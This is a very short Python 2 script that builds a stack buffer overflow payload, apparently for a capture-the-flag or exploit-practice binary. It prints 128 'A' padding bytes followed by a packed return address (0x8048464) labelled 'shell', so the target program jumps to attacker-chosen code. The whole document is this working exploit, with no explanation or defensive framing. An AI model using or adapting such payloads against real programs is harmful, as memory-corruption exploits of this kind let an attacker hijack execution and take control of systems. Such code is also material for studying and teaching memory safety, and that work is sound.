
import struct

padding = "A" * 128 
shell = struct.pack("I", 0x8048464)
print padding + shell